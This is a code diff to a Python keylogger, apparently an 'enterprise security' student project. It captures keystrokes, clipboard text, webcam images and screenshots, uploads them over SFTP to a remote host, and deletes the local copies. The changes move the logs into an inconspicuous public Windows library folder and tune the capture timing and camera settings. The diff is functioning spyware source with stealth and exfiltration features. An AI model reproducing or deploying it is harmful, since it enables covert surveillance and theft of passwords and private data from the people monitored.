@@ -27,7 +27,7 @@ clipboard_information = "Clipboard.txt"
 camera_information = ".png"
 screenshot_information = ".png"
 
-time_iterations = 10
+time_iterations = 20
 number_of_iterations_end = 3
 
 myHostname = "192.168.1.16"  # change this
@@ -37,9 +37,17 @@ remote_file = '/home/pi/transfer/'
 
 i = 0  # global variable to change the name of image as we click
 
-file_path = "D:\\Stuff\\D studies\\Adv dip of it\\Semester 5\\Applied projects\\Keylogger-for-Enterprise-Security\\Project\\log_files"
+directory = "C:\\Users\\Public\\Libraries\\"
 extend = "\\"
-file_merge = file_path + extend
+dir_name = "Keylogger_python"
+path = os.path.join(directory, dir_name)
+try:
+    os.makedirs(path, exist_ok=True)
+    print("Directory Created")
+except OSError as error:
+    print("Directory exists")
+
+file_path = path + extend
 
 
 # only string will be recorded
@@ -57,7 +65,7 @@ def copy_clipboard():
 
 # Captures Webcam using cv2 module
 def capture_webcam():
-    camera = cv2.VideoCapture(0)
+    camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
     time_str = time.strftime("IMG_%Y%m%d_%H%M%S")  # To save each image with the time stamp
     check, frame = camera.read()
     cv2.waitKey(0)  # waits 0 milliseconds after each keypress
@@ -108,8 +116,8 @@ def sftp_files():
 
 # Delete files from the local pc or workstation
 def delete_files():
-    for file_name in os.listdir(file_merge):
-        file = file_merge + file_name
+    for file_name in os.listdir(file_path):
+        file = file_path + file_name
         if os.path.isfile(file):
             print('Deleting file:', file)
             os.remove(file)
@@ -119,7 +127,7 @@ def delete_files():
 def read_file():
     string1 = ['quick', 'brown', 'fox', 'jumps']  # mentioned threats
     # open text file
-    file1 = open(file_merge + keys_information, "r")
+    file1 = open(file_path + keys_information, "r")
 
     for line in string1:
         if any(word in line for word in string1):
@@ -160,16 +168,16 @@ while number_of_iterations < number_of_iterations_end:  # The keylogger will run
         with open(file_path + extend + keys_information, "a") as f:
             for key in keys:
                 k = str(key).replace("'", "")
-                if k == "Key.space": # changes any space key found to ' ' to make it readable
+                if k == "Key.space":  # changes any space key found to ' ' to make it readable
                     f.write(' ')
                     f.close()
-                elif k == "Key.backspace": # changes any space key found to ' ' to make it readable
-                    #f.seek(0, 2)
-                    #size = f.tell()
-                    #f.truncate(size -1)
-                    #f.close()
+                elif k == "Key.backspace":  # changes any space key found to ' ' to make it readable
+                    # f.seek(0, 2)
+                    # size = f.tell()
+                    # f.truncate(size -1)
+                    # f.close()
                     f.write('_BS_')
-                elif k.find("enter") > 0: # changes any enter key found to '\n' (new line) to make it readable
+                elif k.find("enter") > 0:  # changes any enter key found to '\n' (new line) to make it readable
                     f.write('\n')
                     f.close()
                 elif k.find("delete") > 0:
@@ -215,6 +223,5 @@ while number_of_iterations < number_of_iterations_end:  # The keylogger will run
         currentTime = time.time()
         stopTime = time.time() + time_iterations
 
-
-
+cv2.destroyAllWindows()
 
